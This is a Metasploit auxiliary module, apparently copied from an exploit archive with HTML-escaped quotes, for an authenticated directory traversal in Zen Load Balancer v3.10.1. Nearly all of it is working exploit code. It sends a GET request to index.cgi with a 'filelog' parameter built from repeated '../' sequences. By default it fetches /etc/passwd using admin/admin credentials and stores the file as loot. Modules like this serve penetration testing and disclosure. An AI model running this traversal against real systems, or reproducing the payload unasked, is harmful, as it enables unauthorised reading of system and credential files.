# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Zen Load Balancer Directory Traversal",
      &#039;Description&#039;    => %q{
          This module exploits a authenticated directory traversal
vulnerability in Zen Load
          Balancer `v3.10.1`. The flaw exists in &#039;index.cgi&#039; not
properly handling &#039;filelog=&#039;
          parameter which allows a malicious actor to load arbitrary file path.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Basim Alabdullah&#039;, # Vulnerability discovery
          &#039;Dhiraj Mishra&#039;     # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;48308&#039;]
        ],
      &#039;DisclosureDate&#039; => "Apr 10 2020"
    ))

    register_options(
      [
        Opt::RPORT(444),
        OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
        OptInt.new(&#039;DEPTH&#039;, [true, &#039;The max traversal depth&#039;, 16]),
        OptString.new(&#039;FILEPATH&#039;, [false, &#039;The name of the file to
download&#039;, &#039;/etc/passwd&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [true, "The base URI path of the
ZenConsole install", &#039;/&#039;]),
        OptString.new(&#039;HttpUsername&#039;, [true, &#039;The username to use for
the HTTP server&#039;, &#039;admin&#039;]),
        OptString.new(&#039;HttpPassword&#039;, [false, &#039;The password to use for
the HTTP server&#039;, &#039;admin&#039;])
      ])
  end

  def run_host(ip)
    filename = datastore[&#039;FILEPATH&#039;]
    traversal = "../" * datastore[&#039;DEPTH&#039;]

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.cgi&#039;),
      &#039;vars_get&#039;=>
      {
        &#039;id&#039;      => &#039;2-3&#039;,
        &#039;filelog&#039; => "#{traversal}#{filename}",
        &#039;nlines&#039;  => &#039;100&#039;,
        &#039;action&#039;  => &#039;See logs&#039;
      },
      &#039;authorization&#039; =>
basic_auth(datastore[&#039;HttpUsername&#039;],datastore[&#039;HttpPassword&#039;])
      }, 25)

    unless res && res.code == 200
      print_error(&#039;Nothing was downloaded&#039;)
      return
    end

    print_good("#{peer} - Downloaded #{res.body.length} bytes")
    path = store_loot(
      &#039;zenload.http&#039;,
      &#039;text/plain&#039;,
      ip,
      res.body,
      filename
    )
    print_good("File saved in: #{path}")
  end
end

